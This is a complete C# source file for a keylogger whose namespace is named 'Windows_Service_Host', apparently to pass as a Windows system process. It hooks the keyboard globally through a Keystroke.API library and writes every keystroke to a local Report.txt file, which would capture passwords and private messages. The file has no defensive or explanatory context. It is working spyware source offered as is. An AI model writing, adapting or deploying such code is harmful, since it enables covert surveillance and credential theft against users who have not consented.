using System;
using System.Drawing;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Keystroke.API;
using System.ComponentModel;
using System.IO;
using System.Windows.Markup;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;

namespace Windows_Service_Host
{
    class Keylogger
    {


        public static void createFile()
        {
            using (FileStream fs = File.Create("Report.txt"))
            {
                //Byte[] info = new UTF8Encoding(true).GetBytes("");
                //fs.Write(info, 0, info.Length);
            }
        }
        
        // The main method displays the date and outputs any keystrokes typed while the program is opened.
        // side effects: console output
        static void Main(string[] args)
        {
            using (var api = new KeystrokeAPI())
            {
                if (!File.Exists("Report.txt"))
                {
                    createFile();
                }
                StreamWriter report = new StreamWriter("Report.txt", append: true);
                report.AutoFlush = true;
                using (report)
                {
                    api.CreateKeyboardHook((character) =>
                    {
                        Console.Write(character);
                        report.Write(character);
                    });

                Application.Run();
                }
            }
        }

    }
}
